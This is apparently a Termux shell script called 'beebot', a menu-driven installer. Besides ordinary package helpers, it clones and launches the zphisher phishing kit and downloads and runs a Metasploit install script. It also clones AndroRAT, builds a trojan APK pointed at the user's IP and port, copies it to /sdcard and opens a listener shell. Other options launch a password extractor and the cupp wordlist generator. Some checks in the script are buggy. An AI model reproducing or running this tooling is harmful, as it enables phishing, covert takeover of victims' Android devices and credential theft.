#!/system/bin/sh


# loading...
echo "opening beebot..."
sleep 4
clear

logo3="""

▄▄▄▄· ▄▄▄ .▄▄▄ .    ▄▄▄▄·       ▄▄▄▄▄
▐█ ▀█▪▀▄.▀·▀▄.▀·    ▐█ ▀█▪▪     •██  
▐█▀▀█▄▐▀▀▪▄▐▀▀▪▄    ▐█▀▀█▄ ▄█▀▄  ▐█.▪
██▄▪▐█▐█▄▄▌▐█▄▄▌    ██▄▪▐█▐█▌.▐▌ ▐█▌·
·▀▀▀▀  ▀▀▀  ▀▀▀     ·▀▀▀▀  ▀█▄▀▪ ▀▀▀ 
                      author: mr.nobody
""";echo "$logo3"

plate="************************************************"
echo "$plate"
echo "After Loop opened Note: to exit you use CTRL+C"
echo "$plate"

sleep 0.2


# selecting an option
# op function
echo """
[01] sh_packages     [02] py_packages
[03] apt_install     [04] git_cloning
[05] wget_cloning    [06] php_server
[07] metasploit      [08] zphisher
[09] androRAT        [10] html_templates
[11] mid9t_Command   [12] cupp (wordlist)
[E] exit
"""


while true;do
  read -p "[+] select any option: " op
  case $op in
  
  
  #--------------------------------------------------------------------#
  #------------------PKG-------------------#
  #--------------------------------------------------------------------#
    01 )sleep 3
  pkglogo="""
  
┌─┐┬┌─┌─┐  ┬┌┐┌┌─┐┌┬┐┌─┐┬  ┬  ┌─┐┌┬┐┬┌─┐┌┐┌
├─┘├┴┐│ ┬  ││││└─┐ │ ├─┤│  │  ├─┤ │ ││ ││││
┴  ┴ ┴└─┘  ┴┘└┘└─┘ ┴ ┴ ┴┴─┘┴─┘┴ ┴ ┴ ┴└─┘┘└┘

  """
  clear
  echo "$pkglogo"
  echo "[+] Package installation started [+] "
  while true
  do
    read -p "Enter pkg name: " pkgN
    
    # check for pkgN
    echo ""
    if command -v $pkgN;then
      echo "Command $pkgN is already installed"
    else
      echo "Command is not installed, installing..."
      pkg install $pkgN -y
      clear
      echo "$pkglogo"
    fi
    
    if command -v $pkgN;then
      echo "$pkgN is installed"
    else
      echo "package is not installed..."
      echo "manualy run: pkg install $pkgN "
    fi
    # check for pkgN
  done
  
      break;;
  #--------------------------------------------------------------------#
  #------------------------PKG--------------------------#
  #--------------------------------------------------------------------#
      
    
    #--------------------------------------------------------------------#
    #------------------------PIP--------------------------#
    #--------------------------------------------------------------------#
      02 ) 
    clear
    piplogo="""
    
┌─┐┬┌─┐  ┬┌┐┌┌─┐┌┬┐┌─┐┬  ┬  ┌─┐┌┬┐┬┌─┐┌┐┌
├─┘│├─┘  ││││└─┐ │ ├─┤│  │  ├─┤ │ ││ ││││
┴  ┴┴    ┴┘└┘└─┘ ┴ ┴ ┴┴─┘┴─┘┴ ┴ ┴ ┴└─┘┘└┘

    """
    echo "$piplogo"
    echo "[+] Pip installation started [+] "
    
    while true
  do
    read -p "Enter pip name: " pipN
    
    # check for pkgN
    echo ""
    if pip show $pipN;then
       echo "$pipN already installed"
       sleep 3
       clear
       echo "$piplogo"
    
    else
      echo "Command is not installed, installing..."
      pip install $pipN
      clear
      echo "$pkglogo"
    fi
    
    if command -v $pkgN;then
      echo "$pipN is available"
    else
      echo "package is not installed..."
      echo "manualy run: pip install $pipN "
    fi
    # check for pkgN
  done
    
        break;;
    #--------------------------------------------------------------------#
    #------------------------PIP--------------------------#
    #--------------------------------------------------------------------#
        
        
        
    #--------------------------------------------------------------------#
    #------------------------APT--------------------------#
    #--------------------------------------------------------------------#
    03 )clear
    aptlogo="""
┌─┐┌─┐┌┬┐  ┬┌┐┌┌─┐┌┬┐┌─┐┬  ┬  ┌─┐┌┬┐┬┌─┐┌┐┌
├─┤├─┘ │   ││││└─┐ │ ├─┤│  │  ├─┤ │ ││ ││││
┴ ┴┴   ┴   ┴┘└┘└─┘ ┴ ┴ ┴┴─┘┴─┘┴ ┴ ┴ ┴└─┘┘└┘
  """
    echo "$aptlogo"
    echo "[01] apt packages    [02] apt updates";echo ""
    
    while true;do
    read -p "Select any options: " pop
    case $pop in
    01 )
      
  clear
  echo "$aptlogo"
  echo "[+] apt package installation started [+] "
  while true
  do
    read -p "Enter apt name: " aptN
    
    # check for aptN
      apt install $aptN
      sleep 6
      clear
      echo "$aptlogo"
  done
  
    break;;
    
    02 )
    clear
    echo "$aptlogo"
    echo "[+] auto updating apt [+]"
    apt update && apt upgrade
    break;;
    
   * )echo "you did not enter a valid option";;
    
    esac
  done
    break;;
    #--------------------------------------------------------------------#
    #------------------------APT--------------------------#
    #--------------------------------------------------------------------#

        
        
        
    #--------------------------------------------------------------------#
    #------------------------gitCLONE--------------------------#
    #--------------------------------------------------------------------#
      04 )
        clear
    gitlogo="""
    
┌─┐┬┌┬┐  ┌─┐┬  ┌─┐┌┐┌┬┌┐┌┌─┐
│ ┬│ │   │  │  │ │││││││││ ┬
└─┘┴ ┴   └─┘┴─┘└─┘┘└┘┴┘└┘└─┘

    """
    echo "$gitlogo"
    echo "[+] git cloning started [+]"
    
    while true
    do
      read -p "git user_name: " Uname
      read -p "git file_name: " Dname
      gitlink="https://github.com/$Uname/$Dname"
      
      # check for directory
      if [ -d $Dname ];then
        echo "Directory already exists: $(pwd)"
      else
        echo "Directory does not exists"
        git clone $gitlink
      fi
      if [ -d $Dname ];then
        echo "$Dname directory is available"
      else
        echo "$Dname directory is not available"
        echo "re-run me please!"
      fi
      # check for directory
      
    done
    
    break;;
    #--------------------------------------------------------------------#
    #------------------------gitCLONE--------------------------#
    #--------------------------------------------------------------------#
          
          
          #--------------------------------------------------------------------#
        #------------------------WGET--------------------------#
        #--------------------------------------------------------------------#
      05 )
        clear
        echo "$logo3"
        echo """
          ================================
          => wget respotory clonning Bot <=
          ================================
        """
        echo "checking for wget command..."
        sleep 2
        # is wger command available
        if command -v wget;then
          echo "wget command is available"
        else
          echo "wget command is unavailable"
          echo "installing wget..."
          pkg install wget -y
        fi
          
          read -p "wget username: " wgUname
          read -p "wget file or path: " wgFname
          
          echo "wget https://raw.githubusercontent.com/$wgUname/$wgFname"
          echo "posting...";sleep 3
          # post on this
          wget https://raw.githubusercontent.com/$wgUname/$wgFname
          
      break;;
        #--------------------------------------------------------------------#
        #------------------------WGET--------------------------#
        #--------------------------------------------------------------------#
          
          
          
          #--------------------------------------------------------------------#
          #------------------------PHP STARTER--------------------------#
          #--------------------------------------------------------------------#
     06 )
          echo "Opening php...";sleep 0.5
          clear
          echo "$logo3"
          
          # select section
          
          select op in "automated_localhost:" "manual_localhost:" "exit"
          do
            case $op in
            
            # automated
            automated_localhost: )
             echo " ) Welcome to php ( "
           echo "automated localhost:8383"
          
          # check if php is available
           if command -v php;then
             echo "php is already installed."
            # perform action
            read -p "Set path directory: " dir
            cd $dir && php -S localhost:8383
          
           else
             echo "php is not installed, installing..."
             pkg install php
              # after installation
             # check again 
             if command -v php;then
              echo "php has been installed now"
          
            # perfom action
             read -p "Set path directory: " dir
             cd $dir && php -S localhost:8383
          
             else
              echo ""
              echo "php has not been installed still"
               # display posible solution
              echo "run 'pkg install php' manually."
              echo "And re-run me"
              fi
            # perfom action
           fi
          # check if php is installed
            break;;
            # automated
            
            # manual
            manual_localhost: )
            echo " ) Welcome to php ( "
            echo "manual localhost: [yourport]"
            
            
            # check if php is available
           if command -v php;then
             echo "php is already installed."
            # perform action
            read -p "Local Port: " p
            read -p "Set path directory: " dir
            cd $dir && php -S localhost:$p
            
           else
             echo "php is not installed, installing..."
             pkg install php
              # after installation
             # check again 
             if command -v php;then
              echo "php has been installed now"
          
            # perfom action
            read -p "Local Port: " p
            read -p "Set path directory: " dir
            cd $dir && php -S localhost:$p
          
             else
              echo ""
              echo "php has not been installed still"
               # display posible solution
              echo "run 'pkg install php' manually."
              echo "And re-run me"
              fi
            # perfom action
           fi
          # check if php is installed
            break;;
            # manual
            
            exit ) echo "Abort!"; exit;;
          esac
          done
          # select section
          
          break;;
          #--------------------------------------------------------------------#
          #------------------------PHP STARTER--------------------------#
          #--------------------------------------------------------------------#
            
            
            
            
            #-------metasploit framework installer------#
            07 )
            metalogo="""

┌┬┐┌─┐┌┬┐┌─┐┌─┐┌─┐┬  ┌─┐┬┌┬┐
│││├┤  │ ├─┤└─┐├─┘│  │ ││ │ 
┴ ┴└─┘ ┴ ┴ ┴└─┘┴  ┴─┘└─┘┴ ┴ 

            """
            clear
            echo "opening..."
            sleep 10
            echo "$metalogo"
                        # check if ncurses-utils is installed
            if command -v ncurses-utils;then
              echo "First requirement is sutisfied"
            else
              echo "ncurses-utils is not installed, installing..."
              apt install ncurses-utils
            fi
            
            
            req="apt wget curl openssh git"
            #---- START
            # check if already installed
            if [ -f metasploit.sh ];then
             pkg install $req -y
            
             chmod +x * metasploit.sh
            
             echo ""
             echo "Finishing command: >>  msfconsole <<"
             echo ""
             sleep 6
             ./metasploit.sh
            else
            
            clear
            echo "$metalogo"
            echo "Opening..."
            echo "[+] Auto installation for metasploit [+]"
            sleep 5
            
            
            # check commands
            echo "Checking...for \"required commands\" "
            sleep 5
            if command -v $req;then
             echo "Commands = available."
            else
             echo "Command = not available, installing..."
             pkg install $req -y
            fi
            metalink="https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh"
            wget $metalink
            
              # check if its available now
            if [ -f metasploit.sh ];then
             echo "The file is in: $(pwd)"
            
             chmod +x * metasploit.sh
            
             echo ""
             echo "Finishing command: >>  msfconsole <<"
             echo ""
             sleep 6
             ./metasploit.sh
            
            else
             echo "The file is not in: $(pwd)"
             echo "Something forbiden happen!"
            fi
            
            
            fi
            #---END
            
            break;;
            #------metasploit framework installer--#
            
            #------zphisher
            08 )
            zplogo="""
            
┌─┐┌─┐┬ ┬┬┌─┐┬ ┬┌─┐┬─┐
┌─┘├─┘├─┤│└─┐├─┤├┤ ├┬┘
└─┘┴  ┴ ┴┴└─┘┴ ┴└─┘┴└─
            
            """
            clear
            echo "Opening zphisher..."
            sleep 5
            clear
            echo "$zplogo"
            zp="zphisher"
            
            # requirements first
            zpreq="git php openssh curl"
            echo "Checking for required commands"
            sleep 5
                if command -v $zpreq;then
                   echo "required commands = True"
                else
                   echo "required commands = False"
                   pkg install $zpreq -y
                fi
            # requirements first
            
            zplink="https://github.com/htr-tech/zphisher"
            echo "Checking for zphisher file..."
            sleep 3
            
            # check for zp directory
            if [ -d "zphisher" ];then
              echo "$(pwd)"
              echo "Opening directory..."
              sleep 3
              cd $zp
              bash $zp.sh
            else
              git clone $zplink
            
                if [ -d zphisher ];then
                   echo "$zp is available"
                else
                   echo "$zp is not available"
                   git clone $zplink
                fi
            
              echo "opening directory..."
              sleep 3
              cd $zp
              bash $zp.sh
            fi
            # check for zp directroy
            
            break;;
            #------zphisher
            
            #------androRat
            09 )
            andlogo="""
            
╔═╗┌┐┌┌┬┐┬─┐┌─┐╦═╗┌─┐┌┬┐
╠═╣│││ ││├┬┘│ │╠╦╝├─┤ │ 
╩ ╩┘└┘─┴┘┴└─└─┘╩╚═┴ ┴ ┴ 

            """
            clear
            echo "[+] Opening AndroRat [+]"
            sleep 3
            echo "checking for requirements..."
            sleep 3
            
            apt update && apt upgrade && pkg install aapt -q

              
              # check openjdk
                if apt show openjdk-17 -a && command -v git;
                then
                    echo "openjdk-17 is installed"
                else
                    echo "openjdk-17 is not installed, installing..."
                    apt install openjdk-17 && pkg install git
                fi
              # check openjdk
            
              # check python
                if command -v python2 python3;then
                   echo "python is available"
                else 
                   echo "python is not available, installing..."
                   pkg install python2 python3
                fi 
              # check python
            
              # check python-pip
                if pip show python-pip;then
                    echo "python-pip is installed"
                else
                    echo "python-pip is not installed, installing..."
                    pip install python-pip
                 fi
              # check python-pip
            
            clear
            echo "$andlogo"
            echo "[+] Done, installing main file... [+]"
            sleep 5
            echo "[+] Checking if the folder already exists [+]"
            
            # check for main folder
            if [ -d AndroRAT ];then
               echo "Folder is already in $(pwd)"
               echo "Opening directory..."
               sleep 4
               cd AndroRAT
               pip install -r requirements.txt
               sleep 2
               clear
               echo "checking for your IP..."
               sleep 2
               ifconfig
               read -p "yourIP: " ip
               read -p "yourPORT: " port
               read -p "AppName include .apk: " app
               python3 androRAT.py --build -i $ip -p $port -o $app
               echo "Coping $app to home directory..."
               sleep 3
               cp $app /sdcard
               echo "Opening shell..."
               sleep 2
               python3 androRAT.py --shell -i 0.0.0.0 -p $port
            else
               echo "Folder is not in $(pwd)"
               echo "Starting..."
               sleep 4
               pkg install git
               sleep 4
               git clone https://github.com/karma9874/AndroRAT
               echo "Opening directory..."
               sleep 4
               cd AndroRAT
               pip install -r requirements.txt
               sleep 3
               clear
               echo "checking for your IP..."
               sleep 2
               ifconfig
               read -p "yourIP: " ip
               read -p "yourPORT: " port
               read -p "AppName include .apk: " app
               python3 androRAT.py --build -i $ip -p $port -o $app
               echo "Coping $app to home directory..."
               sleep 2
               cp $app /sdcard
               echo "Opening shell..."
               sleep 2
               python3 androRAT.py --shell -i 0.0.0.0 -p $port
            fi
            # check for main folder
              
            break;;
            #------androRat
            
            #-----pwgxtractor
            10 )
            hlogo="""
            
┌─┐┬ ┬┌─┐─┐ ┬┌┬┐┬─┐┌─┐┌─┐┌┬┐┌─┐┬─┐
├─┘││││ ┬┌┴┬┘ │ ├┬┘├─┤│   │ │ │├┬┘
┴  └┴┘└─┘┴ └─ ┴ ┴└─┴ ┴└─┘ ┴ └─┘┴└─

            """
            clear
            echo "Opening pwgxtractor..."
            sleep 5
            clear;echo "$hlogo"
            echo "[+] Installing pwgxtractor... [+]";sleep 4
            clear;echo "$hlogo"
            echo "[+] Checking for required packages... [+]";sleep 4
            # package check
            if command -v git && pip show termcolor colorama rich;then
              echo "packages = available"
            else
              echo "packages = False, installing..."
              pkg install git -y
              pip install termcolor colorama rich
            fi
            # package check
            
            clear 
            echo "[+] Checking for pwgxtractor directory... [+]";sleep 4
            
            
            # check folder
            if [ -d PWGXtractor ];then
              echo "The folder exists"
              echo "Opening directory...";sleep 4
              cd PWGXtractor
              chmod +x main.py
              python main.py
            else
              echo "The folder does not exists, starting..."
              git clone https://github.com/bartwel27/PWGXtractor
              echo "Opening directory...";sleep 4
              cd PWGXtractor
              chmod +x main.py
              python main.py
            fi
            # check folder
            
            break;;
            #-----pwgxtractor
            
            
            #-----midnight command
            11 )
            clear
            echo "opening midnight command..."
            sleep 3
            
            if command -v mc;then
             echo "mc command is available, opening..."
             sleep 2
             mc
            else
             echo "mc is not installed, installing..."
             sleep 2
             pkg install mc -y
             sleep 2
             mc
            fi
            
            break;;
            #-------midnight command
            
            #-------cupp wordlist
            12 )
            clear
            
            cuppcode=""""""
            
            echo "opening cupp (wordlist gen)...";sleep 1
            echo "checking for all required dependencies...";sleep 1
            if command -v wget git curl python;then
               echo "/void/Installed...Done"
               echo "checking for cupp directory...";sleep 1
               if [ -d "cupp" ];then
                  echo "cupp directory is avaialable."
                  cd cupp
                  python cupp.py -i
               else
                  git clone https://github.com/Mebus/cupp
                  
                  # check again
                  if [ -d "cupp" ];then
                    cd cupp
                    python cupp.py -i
                   else
                    git clone https://github.com/Mebus/cupp
                    cd cupp
                    python cupp.py -i
                  fi
                  # check again
            
               fi
            else
               pkg install wget git curl python
            fi
            
            
            break;;
            #-------cupp wordlist
            
            E ) echo "Abort!"; exit;;
            * ) echo "you have not yet selected anything"
            ;;
        
      esac
          done